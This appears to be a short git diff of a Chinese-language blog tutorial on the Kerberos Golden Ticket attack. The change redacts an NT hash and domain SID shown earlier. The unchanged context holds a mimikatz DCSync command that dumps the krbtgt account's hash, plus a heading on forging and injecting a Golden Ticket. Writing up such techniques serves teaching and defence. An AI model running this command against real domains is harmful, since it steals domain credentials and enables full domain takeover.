@@ -35,7 +35,7 @@ mimikatz.exe "lsadump::dcsync /user:domain_name\krbtgt /domain:domain_name.com"
 ```
 ![get krbtgt hash](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Goldenn%20Ticket/get%20krbtgt%20hash_1.jpg?raw=true)  
 
-从上图中可以得到nt hash：30eef769c3d770a7b68e71025b7cbc4e和域SID：S-1-5-21-1682317650-3676829891-3458760176  
+从上图中可以得到nt hash：30eefxxxxxxxxxxxxxxxxxxxxxxxcbc4e和域SID：S-1-5-21-xxxxxxxxx-xxxxxxxxxxx1-xxxxxxxxxxxxx  
 
 ### \#0x02 伪造Golden Ticket并导入——Pass the Ticket
 使用非域管账户登录域内已控的机器，在该机器上完成域管权限的找回。  
